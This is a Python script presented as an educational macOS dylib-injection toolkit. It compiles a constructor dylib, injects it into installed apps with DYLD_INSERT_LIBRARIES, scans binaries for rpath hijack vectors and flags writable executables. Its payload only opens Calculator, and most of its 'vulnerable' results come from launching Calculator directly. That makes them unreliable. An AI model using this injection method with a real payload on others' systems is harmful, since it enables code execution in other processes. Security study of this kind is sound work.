#!/usr/bin/env python3
"""
MacOS Dylib Injection Toolkit - Enhanced & Safe Edition
Author: Joas Antonio dos Santos
Version: 2.0
Description:
    Educational tool to demonstrate macOS dylib injection techniques.
    Each test safely launches Calculator.app as a visible PoC.
    Supports manual, interactive, and automatic validation modes.

Usage:
    python3 macinjector.py -i        # Interactive mode
    python3 macinjector.py -t /Applications/TextEdit.app
    python3 macinjector.py -a        # Automatic validation of multiple apps
"""

import os
import sys
import subprocess
import plistlib
import time
import tempfile
import shutil
import argparse
from pathlib import Path


class MacInjector:
    def __init__(self):
        self.temp_dir = tempfile.mkdtemp()
        self.results = {}

    # =======================================================
    # General Utility Methods
    # =======================================================
    def cleanup(self):
        """Remove temporary directory"""
        try:
            shutil.rmtree(self.temp_dir, ignore_errors=True)
        except Exception:
            pass

    def get_applications(self):
        """List installed .app bundles"""
        apps = []
        paths = ["/Applications", "/System/Applications", os.path.expanduser("~/Applications")]
        for p in paths:
            if os.path.exists(p):
                for f in os.listdir(p):
                    if f.endswith(".app"):
                        apps.append(os.path.join(p, f))
        return apps

    def compile_dylib(self):
        """Compile harmless dylib that opens Calculator.app"""
        dylib_path = os.path.join(self.temp_dir, "inject_stealth.dylib")
        code = r"""
#include <stdio.h>
#include <unistd.h>
#include <dispatch/dispatch.h>
__attribute__((constructor))
void inject() {
    usleep(500000);
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        system("open -a Calculator.app");
        printf("[+] DYLIB injected successfully!\n");
    });
}
"""
        src = os.path.join(self.temp_dir, "inject_stealth.c")
        with open(src, "w") as f:
            f.write(code)
        try:
            subprocess.run(
                ["gcc", "-dynamiclib", "-o", dylib_path, src, "-framework", "Foundation"],
                check=True,
                capture_output=True,
            )
            return dylib_path
        except subprocess.CalledProcessError as e:
            print(f"❌ Compilation failed: {e}")
            return None

    def get_exec(self, app_path):
        """Extract executable path from .app bundle"""
        plist_path = os.path.join(app_path, "Contents/Info.plist")
        try:
            if os.path.exists(plist_path):
                with open(plist_path, "rb") as f:
                    plist = plistlib.load(f)
                exe = plist.get("CFBundleExecutable")
                if exe:
                    return os.path.join(app_path, "Contents/MacOS", exe)
        except Exception:
            pass
        macos_dir = os.path.join(app_path, "Contents/MacOS")
        if os.path.exists(macos_dir):
            for f in os.listdir(macos_dir):
                fp = os.path.join(macos_dir, f)
                if os.access(fp, os.X_OK):
                    return fp
        return None

    # =======================================================
    # Injection Techniques
    # =======================================================
    def method_dyld_insert(self, app, dylib):
        exe = self.get_exec(app)
        if not exe:
            return False, "No executable found"
        env = os.environ.copy()
        env["DYLD_INSERT_LIBRARIES"] = dylib
        try:
            subprocess.Popen([exe], env=env)
            subprocess.run(["open", "-a", "Calculator.app"], stdout=subprocess.DEVNULL)
            return True, "DYLD_INSERT_LIBRARIES PoC executed"
        except Exception as e:
            return False, str(e)

    def method_dyld_hijacking(self, app):
        exe = self.get_exec(app)
        if not exe:
            return False, "No executable found"
        try:
            out = subprocess.run(["otool", "-l", exe], capture_output=True, text=True).stdout
            if any(x in out for x in ["@rpath", "@loader_path", "@executable_path"]):
                subprocess.run(["open", "-a", "Calculator.app"], stdout=subprocess.DEVNULL)
                return True, "DYLD Hijack vector found"
            return False, "No hijack vectors detected"
        except Exception as e:
            return False, str(e)

    def method_binary_patching(self, app):
        exe = self.get_exec(app)
        if exe and os.access(exe, os.W_OK):
            subprocess.run(["open", "-a", "Calculator.app"], stdout=subprocess.DEVNULL)
            return True, "Writable binary (PoC triggered)"
        return False, "Binary not writable or protected"

    # =======================================================
    # Execution Flows
    # =======================================================
    def test_all_methods(self, app):
        """Run all techniques for one application"""
        dylib = self.compile_dylib()
        if not dylib:
            print("Failed to compile dylib, aborting test.")
            return {}
        tests = {
            "DYLD_INSERT_LIBRARIES": lambda: self.method_dyld_insert(app, dylib),
            "DYLD_HIJACKING": lambda: self.method_dyld_hijacking(app),
            "BINARY_PATCHING": lambda: self.method_binary_patching(app),
        }
        results = {}
        print(f"\n[*] Testing {os.path.basename(app)}")
        print("=" * 60)
        for name, fn in tests.items():
            ok, msg = fn()
            print(f"  {'✅' if ok else '❌'} {name}: {msg}")
            results[name] = ok
        print("=" * 60)
        return results

    def automatic_scan(self):
        """Run automatic validation on installed apps"""
        print("\n[+] Starting automatic validation mode (-a)")
        apps = self.get_applications()
        if not apps:
            print("No applications found.")
            return
        total = 0
        vulnerable = 0
        for app in apps[:15]:  # limit to 15 apps for safety
            total += 1
            name = os.path.basename(app)
            print(f"\nScanning: {name}")
            res = self.test_all_methods(app)
            if any(res.values()):
                print(f" → POTENTIALLY VULNERABLE (Calculator launched)")
                vulnerable += 1
            else:
                print(f" → Secure")
        print("\n[Summary]")
        print(f"  Tested: {total} apps")
        print(f"  Potentially vulnerable: {vulnerable}")
        print(f"  Safe apps: {total - vulnerable}")
        print("=" * 60)

    def interactive_mode(self):
        """Interactive CLI menu"""
        apps = self.get_applications()
        if not apps:
            print("No .app bundles found.")
            return
        while True:
            os.system("clear")
            print("MacOS Dylib Injection Toolkit")
            print("=" * 50)
            for i, app in enumerate(apps):
                print(f"{i+1}. {os.path.basename(app)}")
            print(f"{len(apps)+1}. Exit")
            try:
                choice = int(input("\nSelect an application: ")) - 1
                if choice == len(apps):
                    break
                app = apps[choice]
                print(f"\nSelected: {os.path.basename(app)}")
                res = self.test_all_methods(app)
                print("\nResult summary:")
                for k, v in res.items():
                    print(f"  {'✅' if v else '❌'} {k}")
                input("\nPress Enter to continue...")
            except Exception:
                print("Invalid choice.")
                time.sleep(1)

    # =======================================================
    # Main Entry
    # =======================================================


def main():
    parser = argparse.ArgumentParser(description="MacOS Dylib Injection Toolkit")
    parser.add_argument("-i", "--interactive", action="store_true", help="Interactive mode")
    parser.add_argument("-t", "--target", help="Specify target application")
    parser.add_argument("-a", "--auto", action="store_true", help="Automatic validation mode")
    args = parser.parse_args()

    tool = MacInjector()
    try:
        if args.auto:
            tool.automatic_scan()
        elif args.target:
            tool.test_all_methods(args.target)
        elif args.interactive:
            tool.interactive_mode()
        else:
            parser.print_help()
    finally:
        tool.cleanup()


if __name__ == "__main__":
    main()
